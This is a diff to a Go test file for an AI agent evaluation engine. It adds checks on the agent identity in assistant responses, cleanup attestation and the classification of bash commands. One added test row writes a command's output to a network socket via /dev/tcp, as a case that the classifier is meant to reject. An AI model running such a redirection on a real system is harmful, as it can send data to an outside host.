@@ -106,6 +106,11 @@ type fakeRuntime struct {
 }
 
 func newFakeRuntime(request RuntimeRequest, writeMarker bool, messages []client.Message) *fakeRuntime {
+	for index := range messages {
+		if messages[index].Info.Role == "assistant" && messages[index].Info.Agent == "" {
+			messages[index].Info.Agent = request.Case.Agent.Name
+		}
+	}
 	root := client.Session{ID: "root", Directory: request.WorkspacePath, Title: "root", Time: client.SessionTime{Created: 1, Updated: 2}}
 	prompt := cloneBoolMap(request.ToolPolicy.PromptTools)
 	prompt["ambient_unknown"] = false
@@ -148,7 +153,7 @@ func newFakeRuntime(request RuntimeRequest, writeMarker bool, messages []client.
 		runtime.response = &client.Response{
 			Info: client.ResponseInfo{
 				ID: "assistant-1", SessionID: "root", Role: "assistant", Finish: "stop",
-				ProviderID: providerID, ModelID: modelID,
+				ProviderID: providerID, ModelID: modelID, Agent: request.Case.Agent.Name,
 				Time: client.MessageTime{Created: 1, Completed: 2},
 			},
 			Parts: []client.Part{{ID: "text-1", SessionID: "root", MessageID: "assistant-1", Type: "text", Text: "Done successfully; verified."}},
@@ -548,6 +553,9 @@ func TestEngineV1PassesExpectedNonZeroSetupAndGreenOracle(t *testing.T) {
 	if result.Error != nil {
 		t.Fatalf("passing result error = %#v", result.Error)
 	}
+	if result.Provenance.Extensions[ProvenanceExtensionRuntimeCleanupAttested] != "true" {
+		t.Fatalf("passing runtime cleanup attestation = %#v", result.Provenance.Extensions)
+	}
 	if !result.TelemetryComplete {
 		t.Fatal("healthy fake SSE should make telemetry evaluable")
 	}
@@ -581,7 +589,9 @@ func TestEngineV1PassesExpectedNonZeroSetupAndGreenOracle(t *testing.T) {
 	if result.Provenance.ConfigDigest != runtimeRequest.ToolPolicy.Digest || result.Provenance.ToolsetDigest != runtimeInfo.ToolsetDigest {
 		t.Fatalf("effective policy provenance = config %q toolset %q, want %q/%q", result.Provenance.ConfigDigest, result.Provenance.ToolsetDigest, runtimeRequest.ToolPolicy.Digest, runtimeInfo.ToolsetDigest)
 	}
-	if result.Provenance.Extensions[provenanceExtensionEffectiveToolPolicyDigest] != runtimeRequest.ToolPolicy.Digest || result.Provenance.Extensions[provenanceExtensionEffectiveToolCatalog] != testDigest {
+	if result.Provenance.Extensions[provenanceExtensionEffectiveToolPolicyDigest] != runtimeRequest.ToolPolicy.Digest ||
+		result.Provenance.Extensions[provenanceExtensionEffectiveAuthorization] != runtimeRequest.ToolPolicy.AuthorizationDigest ||
+		result.Provenance.Extensions[provenanceExtensionEffectiveToolCatalog] != testDigest {
 		t.Fatalf("separate policy/catalog provenance = %#v", result.Provenance.Extensions)
 	}
 	sent := factory.lastRuntime(t).sentRequests()
@@ -599,6 +609,7 @@ func TestValidatePostedResponseRequiresBoundTerminalAssistant(t *testing.T) {
 	newResponse := func() *client.Response {
 		message := completeMessages("Done successfully; verified.")[0]
 		message.Info.ParentID = "msg_user"
+		message.Info.Agent = "orchestrator"
 		return &client.Response{Info: message.Info, Parts: append([]client.Part(nil), message.Parts...)}
 	}
 	tests := []struct {
@@ -611,6 +622,7 @@ func TestValidatePostedResponseRequiresBoundTerminalAssistant(t *testing.T) {
 		{name: "missing message id", mutate: func(response *client.Response) { response.Info.ID = "" }},
 		{name: "session mismatch", mutate: func(response *client.Response) { response.Info.SessionID = "other" }},
 		{name: "parent mismatch", mutate: func(response *client.Response) { response.Info.ParentID = "msg_stale" }},
+		{name: "agent mismatch", mutate: func(response *client.Response) { response.Info.Agent = "default" }},
 		{name: "provider mismatch", mutate: func(response *client.Response) { response.Info.ProviderID = "other" }},
 		{name: "model mismatch", mutate: func(response *client.Response) { response.Info.ModelID = "other" }},
 		{name: "assistant error", mutate: func(response *client.Response) { response.Info.Error = &client.ErrorInfo{Name: "secret-canary"} }},
@@ -633,7 +645,7 @@ func TestValidatePostedResponseRequiresBoundTerminalAssistant(t *testing.T) {
 					test.mutate(response)
 				}
 			}
-			err := validatePostedResponse(response, "root", "msg_user", "openai", "gpt-5")
+			err := validatePostedResponse(response, "root", "msg_user", "orchestrator", "openai", "gpt-5")
 			if code := evaluationCode(err); code != string(evaluationErrorPostResponseInvalid) {
 				t.Fatalf("error code = %q, want %q (error %v)", code, evaluationErrorPostResponseInvalid, err)
 			}
@@ -643,8 +655,13 @@ func TestValidatePostedResponseRequiresBoundTerminalAssistant(t *testing.T) {
 		})
 	}
 
-	if err := validatePostedResponse(newResponse(), "root", "msg_user", "openai", "gpt-5"); err != nil {
-		t.Fatalf("valid terminal assistant rejected: %v", err)
+	if response := newResponse(); response != nil {
+		response.Info.Agent = "orchestrator"
+		if err := validatePostedResponse(response, "root", "msg_user", "orchestrator", "openai", "gpt-5"); err != nil {
+			t.Fatalf("valid terminal assistant rejected: %v", err)
+		}
+	} else {
+		t.Fatal("valid response fixture is nil")
 	}
 }
 
@@ -652,6 +669,7 @@ func TestDurableResponseRequiresStablePostedEnvelopeAndPartIdentities(t *testing
 	newMessages := func() ([]client.Message, *client.Response) {
 		assistant := completeMessages("Done successfully; verified.")[0]
 		assistant.Info.ParentID = "msg_user"
+		assistant.Info.Agent = "orchestrator"
 		user := client.Message{Info: client.ResponseInfo{ID: "msg_user", SessionID: "root", Role: "user"}}
 		response := &client.Response{Info: assistant.Info, Parts: append([]client.Part(nil), assistant.Parts...)}
 		return []client.Message{user, assistant}, response
@@ -662,6 +680,7 @@ func TestDurableResponseRequiresStablePostedEnvelopeAndPartIdentities(t *testing
 	}{
 		{name: "missing parent user", mutate: func(messages []client.Message) { messages[0].Info.ID = "msg_other" }},
 		{name: "wrong parent", mutate: func(messages []client.Message) { messages[1].Info.ParentID = "msg_other" }},
+		{name: "wrong agent", mutate: func(messages []client.Message) { messages[1].Info.Agent = "default" }},
 		{name: "wrong finish", mutate: func(messages []client.Message) { messages[1].Info.Finish = "tool-calls" }},
 		{name: "changed part id", mutate: func(messages []client.Message) { messages[1].Parts[4].ID = "different" }},
 		{name: "changed part type", mutate: func(messages []client.Message) { messages[1].Parts[4].Type = "reasoning" }},
@@ -707,6 +726,7 @@ func TestDurableResponseRequiresStablePostedEnvelopeAndPartIdentities(t *testing
 func TestValidateDurableResponseClassifiesMessageListing(t *testing.T) {
 	assistant := completeMessages("Done successfully; verified.")[0]
 	assistant.Info.ParentID = "msg_user"
+	assistant.Info.Agent = "orchestrator"
 	user := client.Message{Info: client.ResponseInfo{ID: "msg_user", SessionID: "root", Role: "user"}}
 	response := &client.Response{Info: assistant.Info, Parts: append([]client.Part(nil), assistant.Parts...)}
 	traceWith := func(state trace.MessageCollectionState, messages []client.Message) *trace.Trace {
@@ -997,6 +1017,7 @@ func TestWaitForDurableResponseDoesNotRetryGETErrors(t *testing.T) {
 func TestWaitForDurableResponseClassifiesDirectedEndpoint(t *testing.T) {
 	assistant := completeMessages("Done successfully; verified.")[0]
 	assistant.Info.ParentID = "msg_user"
+	assistant.Info.Agent = "orchestrator"
 	response := &client.Response{Info: assistant.Info, Parts: append([]client.Part(nil), assistant.Parts...)}
 	copyMessage := func() *client.Message {
 		copy := assistant
@@ -1161,6 +1182,9 @@ func TestEngineRejectsIncompleteExecutableClosureBeforeAnyCommandOrRuntime(t *te
 	if result.Status != contracts.RunStatusInvalid || result.Error == nil || result.Error.Kind != "toolchain_closure" {
 		t.Fatalf("incomplete closure result = status %q error %#v", result.Status, result.Error)
 	}
+	if result.Provenance.Extensions[ProvenanceExtensionRuntimeCleanupAttested] != "true" {
+		t.Fatalf("no-runtime cleanup attestation = %#v", result.Provenance.Extensions)
+	}
 	if factory.requestCount() != 0 {
 		t.Fatalf("runtime started %d times despite incomplete closure", factory.requestCount())
 	}
@@ -1188,6 +1212,9 @@ func TestEngineV1NeverPassesWhenRuntimeCredentialIntegrityFailsOnClose(t *testin
 	}
 	if result.Status != contracts.RunStatusInvalid || result.Error == nil || result.Error.Kind != "credential_integrity" {
 		t.Fatalf("credential-integrity close result = %#v", result)
+	}
+	if result.Provenance.Extensions[ProvenanceExtensionRuntimeCleanupAttested] != "false" {
+		t.Fatalf("failed runtime close attestation = %#v", result.Provenance.Extensions)
 	}
 	if err := result.Validate(); err != nil {
 		t.Fatal(err)
@@ -1595,6 +1622,50 @@ func TestEngineV1AcceptsExpectedModelAcrossDelegatedSessionTree(t *testing.T) {
 	}
 }
 
+func TestEngineV1RejectsFallbackRootAgentIdentity(t *testing.T) {
+	environment := newTestEnvironment(t, false)
+	factory := &fakeRuntimeFactory{build: func(request RuntimeRequest) *fakeRuntime {
+		runtime := newFakeRuntime(request, true, completeMessages("Done successfully; verified."))
+		runtime.response.Info.Agent = "default"
+		for index := range runtime.messages["root"] {
+			if runtime.messages["root"][index].Info.Role == "assistant" {
+				runtime.messages["root"][index].Info.Agent = "default"
+			}
+		}
+		return runtime
+	}}
+	result, err := newTestEngine(t, environment, factory).Run(
+		context.Background(),
+		environment.caseValue,
+		RunRequest{Variant: "candidate", Repetition: 1},
+	)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if result.Status != contracts.RunStatusInvalid || result.Error == nil || result.Error.Kind != string(evaluationErrorPostResponseInvalid) {
+		t.Fatalf("fallback agent result = status %s error %#v", result.Status, result.Error)
+	}
+}
+
+func TestValidateObservedRootModelRejectsFallbackAgentWithoutLeakingIdentity(t *testing.T) {
+	message := completeMessages("Done successfully; verified.")[0]
+	message.Info.Agent = "secret-fallback-agent"
+	collected := &trace.Trace{
+		RootSessionID: "root",
+		Sessions: []trace.SessionTrace{{
+			Session:  client.Session{ID: "root"},
+			Messages: []client.Message{message},
+		}},
+	}
+	_, _, err := validateObservedRootModel(collected, "openai/gpt-5", "orchestrator")
+	if err == nil || !strings.Contains(err.Error(), "unexpected agent identity") {
+		t.Fatalf("fallback agent error = %v", err)
+	}
+	if strings.Contains(err.Error(), "secret-fallback-agent") {
+		t.Fatalf("fallback agent identity leaked through diagnostic: %v", err)
+	}
+}
+
 func TestEngineV1RejectsDifferentModelInChildSession(t *testing.T) {
 	environment := newTestEnvironment(t, false)
 	factory := &fakeRuntimeFactory{build: func(request RuntimeRequest) *fakeRuntime {
@@ -1856,6 +1927,18 @@ func TestBashSyntheticToolNamesRequireAnExactCommand(t *testing.T) {
 		{command: "git add file.txt && git reset --hard", want: "bash"},
 		{command: "env GIT_CONFIG_NOSYSTEM=1 git add file.txt", want: "bash"},
 		{command: "command git add file.txt", want: "bash"},
+		{command: "skynex workflow start --id wf", want: "workflow_start"},
+		{command: "/usr/local/bin/skynex workflow run wf --detach", want: "workflow_run_detach"},
+		{command: "skynex workflow review --id wf", want: "workflow_review"},
+		{command: "skynex workflow status wf", want: "workflow_status"},
+		{command: "skynex workflow inspect wf", want: "workflow_inspect"},
+		{command: "skynex workflow abort wf", want: "bash"},
+		{command: "skynex workflow unknown wf", want: "bash"},
+		{command: "skynex workflow run wf --detach && echo unsafe", want: "bash"},
+		{command: "skynex workflow status > /tmp/marker", want: "bash"},
+		{command: "skynex workflow status >/dev/tcp/example.invalid/443", want: "bash"},
+		{command: "skynex workflow inspect < input.txt", want: "bash"},
+		{command: "skynex workflow status *", want: "bash"},
 	}
 	for _, test := range tests {
 		input, err := json.Marshal(map[string]string{"command": test.command})
@@ -2111,7 +2194,7 @@ func TestEngineV1EarlyInfrastructureResultIsValid(t *testing.T) {
 		t.Fatalf("early result = %#v", result)
 	}
 	effective := factory.lastRequest(t).ToolPolicy
-	if result.Provenance.ConfigDigest != effective.Digest || result.Provenance.ToolsetDigest != effective.Digest || result.Provenance.Extensions[provenanceExtensionEffectiveToolPolicyDigest] != effective.Digest {
+	if result.Provenance.ConfigDigest != effective.Digest || result.Provenance.ToolsetDigest != effective.AuthorizationDigest || result.Provenance.Extensions[provenanceExtensionEffectiveToolPolicyDigest] != effective.Digest {
 		t.Fatalf("runtime-start failure lost generated policy provenance: result=%#v policy=%#v", result.Provenance, effective)
 	}
 	if result.Provenance.Extensions[provenanceExtensionEffectiveToolStatus] != "unobserved" || result.Provenance.Extensions[provenanceExtensionEffectiveToolCatalog] != "" {
